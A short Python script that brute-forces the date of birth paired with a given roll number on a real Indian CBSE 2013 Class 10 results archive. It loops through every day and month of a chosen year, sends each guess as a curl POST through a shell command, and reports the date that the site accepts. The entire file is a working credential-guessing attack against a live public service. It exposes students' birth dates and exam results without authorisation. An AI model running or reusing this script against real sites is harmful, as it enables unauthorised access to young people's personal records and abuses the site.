import urllib, subprocess, time
regno = int(input("Enter Roll number: "))
year = str(input("Enter the year of DOB: "))
flag, c = 0, 0
start = time.time()
for m in range(1,13):
    for d in range(1,33):
        if d in [1,2,3,4,5,6,7,8,9]:
            if m in [1,2,3,4,5,6,7,8,9]:
                dob = '0'+str(d)+'/'+'0'+str(m)+'/'+year
            else:
                dob = '0'+str(d)+'/'+str(m)+'/'+year
        else:
            if m in [1,2,3,4,5,6,7,8,9]:
                dob = str(d)+'/'+'0'+str(m)+'/'+year
            else:
                dob = dob = str(d)+'/'+str(m)+'/'+year
        cdob = urllib.parse.quote_plus(dob)
        cmd = "curl 'http://resultsarchives.nic.in/cbseresults/cbseresults2013/class10/cbse102013cvb.asp' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' --compressed -H 'Accept-Language: en-US,en;q=0.5' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: resultsarchives.nic.in' -H 'Referer: http://resultsarchives.nic.in/cbseresults/cbseresults2013/class10/cbse102013cvb.htm' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0' --data 'regno={}&dob={}&B1=Submit'".format(regno,cdob)
        handle = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True, shell=True)
        res = handle.stdout.read()
        if str(res).find('Please verify your Roll Number/DOB and try again') != -1:
            print("Wrong Credentials")
            c += 1
        else:
            print(dob," ",regno)
            flag = 1
            break
    if flag == 1:
        break
print(time.time()-start)
